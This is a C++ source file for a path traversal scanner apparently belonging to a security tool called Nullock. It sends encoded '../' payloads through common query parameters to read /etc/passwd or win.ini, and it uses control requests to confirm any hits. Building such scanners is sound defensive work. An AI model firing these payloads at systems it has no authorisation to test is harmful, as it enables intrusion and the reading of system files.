#include "path_traversal.hpp"
#include "networking.hpp"

#include <QRandomGenerator>
#include <QRegularExpression>
#include <QSet>
#include <QUrlQuery>

namespace Nullock::Core::PathTraversal {

namespace {

// A whole scan is bounded to this many sends so a slow/blackholing host can't
// stall the (synchronous) endpoint for minutes across the payload matrix.
constexpr int kMaxSends  = 130;
constexpr int kMaxParams = 12;

struct Target {
    const char *name;        // display
    QRegularExpression sig;  // content fingerprint
    QStringList suffixes;    // file path tails to traverse to
};

const QList<Target> &targets() {
    static const QList<Target> t = {
        // Line-scoped and multi-field so a passing mention of "root:x:0:0:"
        // in prose doesn't match -- this is the shape of a real passwd line.
        { "/etc/passwd",
          QRegularExpression("root:[^:\\n]*:0:0:[^:\\n]*:[^:\\n]*:"),
          { "etc/passwd" } },
        { "windows/win.ini",
          QRegularExpression("\\[(?:fonts|extensions|mci extensions)\\]",
                             QRegularExpression::CaseInsensitiveOption),
          { "windows/win.ini", "windows\\win.ini" } },
    };
    return t;
}

// Encodings of "../" (and "..\") a vulnerable resolver might accept, applied
// as a prefix repeated deep enough to reach the filesystem root.
struct Encoding {
    const char *technique;
    QString (*depth)(int);   // build the traversal prefix for N levels
    bool windows;            // pairs with backslash suffix
};

QString rep(const QString &unit, int n) {
    QString s; for (int i = 0; i < n; ++i) s += unit; return s;
}

const QList<Encoding> &encodings() {
    static const QList<Encoding> e = {
        { "dotdot",         [](int n){ return rep("../", n); },        false },
        { "encoded",        [](int n){ return rep("%2e%2e%2f", n); },  false },
        { "nested",         [](int n){ return rep("....//", n); },     false },
        { "double-encoded", [](int n){ return rep("..%252f", n); },    false },
        { "backslash",      [](int n){ return rep("..\\", n); },       true  },
        { "encoded-bslash", [](int n){ return rep("..%5c", n); },      true  },
    };
    return e;
}

// Splice the raw (already-encoded) value into the query, preserving others.
QString queryWith(const QString &existing, const QString &param, const QString &rawValue) {
    QStringList parts;
    const QUrlQuery q(existing);
    for (const auto &kv : q.queryItems(QUrl::FullyEncoded))
        if (QUrl::fromPercentEncoding(kv.first.toUtf8()) != param)
            parts << kv.first + "=" + kv.second;
    parts << param + "=" + rawValue;
    return parts.join('&');
}

QString randToken() {
    static const char hex[] = "0123456789abcdef";
    QString s;
    for (int i = 0; i < 10; ++i) s += hex[QRandomGenerator::global()->bounded(16)];
    return s;
}

} // namespace

QStringList defaultParams() {
    // Ordered by LFI yield so the cap keeps the highest-signal names; overflow
    // (for caller-supplied query params) goes to droppedParams.
    return { "file", "path", "include", "download", "filename", "template",
             "doc", "document", "view", "load", "page", "dir", "name", "lang" };
}

Result test(const Request &reqIn) {
    Result result;
    if (reqIn.host.isEmpty()) { result.error = "host required"; return result; }
    Request req = reqIn;
    if (req.basePath.isEmpty()) req.basePath = QStringLiteral("/");

    QStringList params;
    if (!req.param.isEmpty()) {
        params << req.param;
    } else {
        const QUrlQuery q(req.query);
        for (const auto &kv : q.queryItems())
            if (!params.contains(kv.first)) params << kv.first;
        if (params.isEmpty()) params = defaultParams();
    }
    if (params.size() > kMaxParams) {
        result.droppedParams = params.mid(kMaxParams);   // surfaced so a clean
        params = params.mid(0, kMaxParams);              // result isn't silently partial
    }
    result.testedParams = params;

    HttpClient client;
    const quint16 port = static_cast<quint16>(req.port);
    auto send = [&](const QString &query) {
        ++result.requestsSent;
        return client.send(req.host, port, req.tls, buildRequest(req, query));
    };

    const auto base = send(req.query);
    if (!base.ok) { result.error = "baseline failed: " + base.errorMessage; return result; }
    result.baselineStatus = base.parsed.statusCode;

    // A signature already present at baseline can't be attributed to us.
    QList<Target> usable;
    for (const Target &tgt : targets())
        if (matchSig(tgt.sig, base.parsed.body).isEmpty()) usable << tgt;

    // One deep level reaches the filesystem root from any realistic app depth;
    // extra "../" past root are harmless, so a single depth keeps the matrix
    // (and the wall-clock against a slow host) bounded.
    static const QList<int> depths = { 8 };
    const QString ctlToken = randToken();   // for the shaped/inert control
    QSet<QString> poisoned;                 // targets whose sig is value-keyed, not a real read

    for (const QString &param : params) {
        if (result.requestsSent >= kMaxSends) break;
        bool paramHit = false;
        for (const Target &tgt : usable) {
            if (poisoned.contains(QString::fromUtf8(tgt.name))) continue;
            for (const Encoding &enc : encodings()) {
                for (const QString &suffix : tgt.suffixes) {
                    if (enc.windows != suffix.contains('\\')) continue;
                    for (int d : depths) {
                        if (result.requestsSent + 1 >= kMaxSends) { paramHit = true; break; }
                        const QString payload = enc.depth(d) + suffix;
                        const auto r = send(queryWith(req.query, param, payload));
                        if (!r.ok) continue;
                        if (matchSig(tgt.sig, r.parsed.body).isEmpty()) continue;
                        // Shaped/inert control: same encoding + depth, but a
                        // guaranteed-nonexistent name. A value-keyed error/docs/
                        // help template renders the signature for THIS too (no
                        // real file read) -> suppress and mark the target
                        // poisoned; a real read returns the bogus name's
                        // not-found content, so the control is clean.
                        const QString ctl = enc.depth(d) + "nullock-noexist-" + ctlToken;
                        const auto rc = send(queryWith(req.query, param, ctl));
                        if (rc.ok && !matchSig(tgt.sig, rc.parsed.body).isEmpty()) {
                            poisoned.insert(QString::fromUtf8(tgt.name));
                            break;   // value-keyed template, not a file read
                        }
                        result.hits.append({ param, QString::fromUtf8(enc.technique),
                                             QString::fromUtf8(tgt.name), payload,
                                             matchSig(tgt.sig, r.parsed.body) });
                        result.vulnerable = true;
                        paramHit = true;
                        break;
                    }
                    if (paramHit || poisoned.contains(QString::fromUtf8(tgt.name))) break;
                }
                if (paramHit || poisoned.contains(QString::fromUtf8(tgt.name))) break;
            }
            if (paramHit) break;   // one confirmed file read per param is enough
        }
    }

    return result;
}

} // namespace Nullock::Core::PathTraversal
